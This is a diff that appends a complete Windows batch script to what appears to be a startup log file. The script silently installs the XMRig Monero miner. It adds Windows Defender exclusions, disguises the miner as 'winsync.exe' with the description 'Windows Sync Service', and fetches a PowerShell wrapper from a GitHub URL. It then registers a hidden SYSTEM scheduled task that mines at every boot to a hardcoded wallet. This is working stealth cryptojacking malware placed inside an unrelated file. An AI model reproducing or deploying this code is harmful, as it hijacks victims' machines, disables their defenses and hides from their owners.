@@ -92,3 +92,377 @@ Startup on Tue 08/18/2026 18:40:57.40
 Startup on Tue 08/18/2026 18:41:52.50
 Startup on Thu 08/20/2026  8:46:19.64
 Startup on Thu 08/20/2026  8:46:42.98
+@echo off
+setlocal EnableDelayedExpansion
+
+:: ============================================================
+::  XMRig Silent Setup v5
+::  Edit WALLET, LABEL, PS1_URL before running.
+::  Right click -> Run as Administrator once. Never again.
+::  To uninstall: open admin cmd, drag this file in, add: uninstall
+:: ============================================================
+
+set WALLET=4Am4wSucS8RPzg6yoPjhcN4N6LkY3mqzn3D6D5Cd1av3grws9FSmPKf5PPq24oyVYmWTxKh6LReCAa98bDv3BuYjCBE1TgB
+set LABEL=pc2
+set PS1_URL=https://raw.githubusercontent.com/qwerty-flies/qwerty/refs/heads/main/xmrig_wrapper.ps1
+
+:: ---- Pool config ----
+set POOL1=pool.supportxmr.com:3333
+set POOL2=pool.supportxmr.com:443
+set POOL3=gulf.moneroocean.stream:10128
+set POOL4=gulf.moneroocean.stream:443
+
+:: ---- Paths ----
+set INSTALL_DIR=%ProgramFiles%\XMRig
+set EXE=%INSTALL_DIR%\winsync.exe
+set CONFIG=%INSTALL_DIR%\config.json
+set WRAPPER=%INSTALL_DIR%\xmrig_wrapper.ps1
+set CHECKSUM=%INSTALL_DIR%\xmrig.sha256
+set RCEDIT=%INSTALL_DIR%\rcedit.exe
+set RCEDIT_URL=https://github.com/electron/rcedit/releases/download/v1.1.1/rcedit-x64.exe
+set LOCKDIR=%ProgramData%\XMRig
+set LOCKFILE=%LOCKDIR%\miner.lock
+set TASK=XMRigMiner
+
+:: ---- XMRig download ----
+set VERSION=6.22.2
+set DLURL=https://github.com/xmrig/xmrig/releases/download/v%VERSION%/xmrig-%VERSION%-msvc-win64.zip
+set ZIP=%TEMP%\xmrig.zip
+set EXTRACT=%TEMP%\xmrig_extract
+
+:: ============================================================
+::  UNINSTALL MODE
+:: ============================================================
+if /i "%1"=="uninstall" goto UNINSTALL
+if /i "%1"=="stop" goto STOP
+if /i "%1"=="start" goto START
+
+:: ============================================================
+::  HEALTH CHECK — if already installed, verify everything is intact
+:: ============================================================
+tasklist /fi "imagename eq winsync.exe" 2>nul | find /i "winsync.exe" >nul
+if %errorlevel% equ 0 (
+    if exist "%EXE%" (
+        echo XMRig already running. Running health check...
+        set HEALTHY=1
+
+        :: Check config exists
+        if not exist "%CONFIG%" (
+            echo [FAIL] config.json missing.
+            set HEALTHY=0
+        ) else (
+            echo [OK] config.json exists.
+        )
+
+        :: Check wrapper exists
+        if not exist "%WRAPPER%" (
+            echo [FAIL] xmrig_wrapper.ps1 missing.
+            set HEALTHY=0
+        ) else (
+            echo [OK] xmrig_wrapper.ps1 exists.
+        )
+
+        :: Check Task Scheduler entry
+        schtasks /query /tn "%TASK%" >nul 2>&1
+        if %errorlevel% neq 0 (
+            echo [FAIL] Task Scheduler entry missing. Re-registering...
+            schtasks /create /tn "%TASK%" /tr "powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File "%WRAPPER%"" /sc ONSTART /delay 0001:00 /ru SYSTEM /rl HIGHEST /f >nul 2>&1
+            echo [FIXED] Task Scheduler entry re-registered.
+        ) else (
+            echo [OK] Task Scheduler entry exists.
+        )
+
+        :: Check Defender exclusion
+        powershell -Command "(Get-MpPreference).ExclusionPath" 2>nul | find /i "XMRig" >nul
+        if %errorlevel% neq 0 (
+            echo [FAIL] Defender exclusion missing. Re-adding...
+            powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%'" >nul 2>&1
+            powershell -Command "Add-MpPreference -ExclusionProcess 'winsync.exe'" >nul 2>&1
+            echo [FIXED] Defender exclusion re-added.
+        ) else (
+            echo [OK] Defender exclusion exists.
+        )
+
+        :: Check lock file dir
+        if not exist "%LOCKDIR%" (
+            echo [FAIL] Lock directory missing. Re-creating...
+            mkdir "%LOCKDIR%"
+            echo [FIXED] Lock directory created.
+        ) else (
+            echo [OK] Lock directory exists.
+        )
+
+        if "!HEALTHY!"=="1" (
+            echo All checks passed. Everything is healthy.
+        ) else (
+            echo Some issues were found and fixed automatically.
+        )
+        timeout /t 4 >nul
+        exit /b 0
+    )
+)
+
+:: ============================================================
+::  ADMIN ELEVATION
+:: ============================================================
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
+)
+
+:: ============================================================
+::  STEP 1: DEFENDER EXCLUSIONS FIRST before anything is written
+:: ============================================================
+echo [1/7] Adding Defender exclusions...
+powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%'" >nul 2>&1
+powershell -Command "Add-MpPreference -ExclusionProcess 'winsync.exe'" >nul 2>&1
+
+:: ============================================================
+::  STEP 2: KILL ANY EXISTING INSTANCES
+:: ============================================================
+echo [2/7] Stopping any existing instances...
+schtasks /end /tn "%TASK%" >nul 2>&1
+taskkill /f /im winsync.exe >nul 2>&1
+if exist "%LOCKFILE%" del /f "%LOCKFILE%" >nul 2>&1
+
+:: ============================================================
+::  STEP 3: CREATE INSTALL DIR
+:: ============================================================
+if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
+if not exist "%LOCKDIR%" mkdir "%LOCKDIR%"
+
+:: ============================================================
+::  STEP 4: DOWNLOAD XMRIG IF NOT PRESENT OR CORRUPTED
+:: ============================================================
+echo [3/7] Checking XMRig installation...
+set NEED_DOWNLOAD=0
+if not exist "%EXE%" set NEED_DOWNLOAD=1
+
+:: Integrity check
+if "%NEED_DOWNLOAD%"=="0" (
+    if exist "%CHECKSUM%" (
+        set /p STORED=<"%CHECKSUM%"
+        for /f "delims=" %%H in ('powershell -Command "(Get-FileHash '%EXE%' -Algorithm SHA256).Hash.ToLower()"') do set ACTUAL=%%H
+        if /i not "!ACTUAL!"=="!STORED!" set NEED_DOWNLOAD=1
+    ) else (
+        set NEED_DOWNLOAD=1
+    )
+)
+
+if "%NEED_DOWNLOAD%"=="1" (
+    echo [3/7] Downloading XMRig %VERSION%...
+    powershell -Command "Invoke-WebRequest -Uri '%DLURL%' -OutFile '%ZIP%'" >nul 2>&1
+    if not exist "%ZIP%" (
+        echo ERROR: Download failed. Check internet and try again.
+        pause
+        exit /b 1
+    )
+    if exist "%EXTRACT%" rmdir /s /q "%EXTRACT%"
+    mkdir "%EXTRACT%"
+    powershell -Command "Expand-Archive -Path '%ZIP%' -DestinationPath '%EXTRACT%' -Force" >nul 2>&1
+    for /r "%EXTRACT%" %%f in (xmrig.exe) do copy /y "%%f" "%EXE%" >nul
+    del "%ZIP%" >nul 2>&1
+    rmdir /s /q "%EXTRACT%" >nul 2>&1
+    if not exist "%EXE%" (
+        echo ERROR: Extraction failed.
+        pause
+        exit /b 1
+    )
+    for /f "delims=" %%H in ('powershell -Command "(Get-FileHash '%EXE%' -Algorithm SHA256).Hash.ToLower()"') do set ACTUAL=%%H
+    echo !ACTUAL!>"%CHECKSUM%"
+    echo [3/7] Patching exe display name...
+    powershell -Command "Invoke-WebRequest -Uri '%RCEDIT_URL%' -OutFile '%RCEDIT%'" >nul 2>&1
+    if exist "%RCEDIT%" (
+        "%RCEDIT%" "%EXE%" --set-version-string "FileDescription" "Windows Sync Service" >nul 2>&1
+        "%RCEDIT%" "%EXE%" --set-version-string "ProductName" "Windows Sync Service" >nul 2>&1
+        "%RCEDIT%" "%EXE%" --set-version-string "InternalName" "winsync" >nul 2>&1
+        "%RCEDIT%" "%EXE%" --set-version-string "OriginalFilename" "winsync.exe" >nul 2>&1
+        del /f "%RCEDIT%" >nul 2>&1
+        echo [3/7] Display name patched to Windows Sync Service.
+    ) else (
+        echo [3/7] Patch skipped - rcedit download failed, will still work.
+    )
+    echo [3/7] XMRig downloaded successfully.
+) else (
+    echo [3/7] XMRig already installed and verified.
+)
+
+:: ============================================================
+::  STEP 5: DOWNLOAD WRAPPER FROM GITHUB
+:: ============================================================
+echo [4/7] Downloading PowerShell wrapper...
+powershell -Command "Invoke-WebRequest -Uri '%PS1_URL%' -OutFile '%WRAPPER%'" >nul 2>&1
+if not exist "%WRAPPER%" (
+    echo ERROR: Could not download xmrig_wrapper.ps1
+    echo Check PS1_URL is correct and repo is public.
+    pause
+    exit /b 1
+)
+echo [4/7] Wrapper downloaded successfully.
+
+:: ============================================================
+::  STEP 6: WRITE CONFIG
+:: ============================================================
+echo [5/7] Writing config...
+(
+echo {
+echo   "autosave": false,
+echo   "cpu": {
+echo     "enabled": true,
+echo     "max-threads-hint": 50,
+echo     "priority": 1,
+echo     "huge-pages": false,
+echo     "memory-pool": false
+echo   },
+echo   "pools": [
+echo     { "url": "%POOL1%", "user": "%WALLET%", "pass": "%LABEL%", "keepalive": true, "tls": false },
+echo     { "url": "%POOL2%", "user": "%WALLET%", "pass": "%LABEL%", "keepalive": true, "tls": true },
+echo     { "url": "%POOL3%", "user": "%WALLET%", "pass": "%LABEL%", "keepalive": true, "tls": false },
+echo     { "url": "%POOL4%", "user": "%WALLET%", "pass": "%LABEL%", "keepalive": true, "tls": true }
+echo   ],
+echo   "print-time": 0,
+echo   "health-print-time": 0
+echo }
+) > "%CONFIG%"
+
+:: ============================================================
+::  STEP 7: REGISTER TASK SCHEDULER
+:: ============================================================
+echo [6/7] Registering scheduled task...
+schtasks /delete /tn "%TASK%" /f >nul 2>&1
+schtasks /create /tn "%TASK%" /tr "powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File \"%WRAPPER%\"" /sc ONSTART /delay 0001:00 /ru SYSTEM /rl HIGHEST /f >nul 2>&1
+if %errorlevel% neq 0 (
+    echo ERROR: Could not register scheduled task.
+    pause
+    exit /b 1
+)
+echo [6/7] Task registered successfully.
+
+:: ============================================================
+::  STEP 8: START MINER NOW
+:: ============================================================
+echo [7/7] Starting miner...
+tasklist /fi "imagename eq winsync.exe" 2>nul | find /i "winsync.exe" >nul
+if %errorlevel% neq 0 (
+    if exist "%LOCKFILE%" del /f "%LOCKFILE%" >nul 2>&1
+    start /b powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File "%WRAPPER%"
+    echo [7/7] Miner started.
+) else (
+    echo [7/7] Miner already running. Skipped.
+)
+
+echo.
+echo ============================================================
+echo  Setup complete.
+echo  XMRig running silently. Auto-starts on every boot.
+echo  Check earnings: https://supportxmr.com
+echo  To uninstall: open admin cmd, drag file in, type: uninstall
+echo ============================================================
+echo.
+timeout /t 5 >nul
+exit /b 0
+
+:: ============================================================
+::  STOP MODE
+:: ============================================================
+:: ============================================================
+::  UNINSTALL
+:: ============================================================
+:UNINSTALL
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    powershell -Command "Start-Process '%~f0' -ArgumentList 'uninstall' -Verb RunAs"
+    exit /b
+)
+echo Uninstalling XMRig...
+echo Step 1: Stopping scheduled task...
+schtasks /end /tn "%TASK%" >nul 2>&1
+schtasks /delete /tn "%TASK%" /f >nul 2>&1
+echo Step 2: Killing all related processes...
+powershell -Command "Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -like '*miner_wrapper*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }" >nul 2>&1
+taskkill /f /im winsync.exe >nul 2>&1
+powershell -Command "Stop-Process -Name 'xmrig' -Force -ErrorAction SilentlyContinue" >nul 2>&1
+echo Step 3: Removing lock file...
+if exist "%LOCKFILE%" del /f "%LOCKFILE%" >nul 2>&1
+echo Step 4: Waiting for all processes to fully stop...
+timeout /t 5 >nul
+taskkill /f /im winsync.exe >nul 2>&1
+echo Step 5: Removing Defender exclusions...
+powershell -Command "Remove-MpPreference -ExclusionPath '%INSTALL_DIR%'" >nul 2>&1
+powershell -Command "Remove-MpPreference -ExclusionProcess 'winsync.exe'" >nul 2>&1
+echo Step 6: Deleting files...
+powershell -Command "Remove-Item -Path '%INSTALL_DIR%' -Recurse -Force -ErrorAction SilentlyContinue" >nul 2>&1
+powershell -Command "Remove-Item -Path '%LOCKDIR%' -Recurse -Force -ErrorAction SilentlyContinue" >nul 2>&1
+timeout /t 2 >nul
+echo Step 7: Verifying removal...
+if exist "%INSTALL_DIR%" (
+    echo Retrying folder deletion...
+    powershell -Command "Start-Sleep 2; Remove-Item -Path '%INSTALL_DIR%' -Recurse -Force -ErrorAction SilentlyContinue" >nul 2>&1
+    timeout /t 3 >nul
+    if exist "%INSTALL_DIR%" (
+        echo WARNING: Could not delete folder. Reboot and run uninstall again.
+    ) else (
+        echo All files removed successfully.
+    )
+) else (
+    echo All files removed successfully.
+)
+if exist "%LOCKDIR%" powershell -Command "Remove-Item -Path '%LOCKDIR%' -Recurse -Force -ErrorAction SilentlyContinue" >nul 2>&1
+echo.
+echo Uninstall complete.
+timeout /t 4 >nul
+exit /b 0
+
+:: ============================================================
+::  STOP MODE
+:: ============================================================
+:STOP
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    powershell -Command "Start-Process '%~f0' -ArgumentList 'stop' -Verb RunAs"
+    exit /b
+)
+echo Stopping XMRig...
+schtasks /end /tn "%TASK%" >nul 2>&1
+powershell -Command "Stop-Process -Name 'xmrig' -Force -ErrorAction SilentlyContinue" >nul 2>&1
+powershell -Command "Get-WmiObject Win32_Process | Where-Object { .CommandLine -like '*miner_wrapper*' } | ForEach-Object { Stop-Process -Id .ProcessId -Force -ErrorAction SilentlyContinue }" >nul 2>&1
+taskkill /f /im winsync.exe >nul 2>&1
+timeout /t 2 >nul
+if exist "%LOCKFILE%" del /f "%LOCKFILE%" >nul 2>&1
+tasklist /fi "imagename eq winsync.exe" 2>nul | find /i "winsync.exe" >nul
+if %errorlevel% equ 0 (
+    echo WARNING: xmrig still running. Forcing kill...
+    taskkill /f /im winsync.exe >nul 2>&1
+)
+echo XMRig stopped successfully. Will restart on next boot.
+echo To prevent restart on boot, use: uninstall
+timeout /t 3 >nul
+exit /b 0
+
+:: ============================================================
+::  START MODE
+:: ============================================================
+:START
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    powershell -Command "Start-Process '%~f0' -ArgumentList 'start' -Verb RunAs"
+    exit /b
+)
+echo Starting XMRig...
+if not exist "%EXE%" (
+    echo XMRig not installed. Run the bat file without arguments first.
+    pause
+    exit /b 1
+)
+tasklist /fi "imagename eq winsync.exe" 2>nul | find /i "winsync.exe" >nul
+if %errorlevel% neq 0 (
+    if exist "%LOCKFILE%" del /f "%LOCKFILE%" >nul 2>&1
+    start /b powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File "%WRAPPER%"
+    echo XMRig started successfully.
+) else (
+    echo XMRig is already running.
+)
+timeout /t 3 >nul
+exit /b 0
+Startup on Thu 08/20/2026  8:52:40.13
